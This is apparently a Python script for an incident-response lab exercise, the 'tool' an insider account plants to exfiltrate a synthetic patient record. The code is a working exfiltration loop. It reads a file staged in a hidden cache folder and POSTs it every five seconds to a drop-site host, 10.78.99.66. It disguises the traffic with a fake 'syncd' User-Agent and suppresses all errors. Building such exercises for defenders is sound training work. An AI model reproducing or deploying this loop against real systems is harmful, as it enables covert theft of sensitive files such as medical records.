#!/usr/bin/env python3
# LAB SIMULATION - Care Access Navigator IR1 Task 3 (insider exfiltration, incident IR1-2026-005).
# The "tool" the mover account test.nurse plants after reading the SYNTHETIC record PT-1003.
# Every 5 s it POSTs the staged file to the lab drop-site container exfil-sink (10.78.99.66),
# which exists only on the isolated Docker network ir3-internet. No real data, no real internet target.
import os, time, urllib.request

STAGED = os.path.expanduser("~/.cache/.sync/pt1003.txt")
URL = "http://10.78.99.66:8080/sync"
while True:
    try:
        body = open(STAGED, "rb").read()
        urllib.request.urlopen(urllib.request.Request(URL, data=body, method="POST",
                               headers={"User-Agent": "syncd/0.3"}), timeout=4).read()
    except Exception:
        pass
    time.sleep(5)
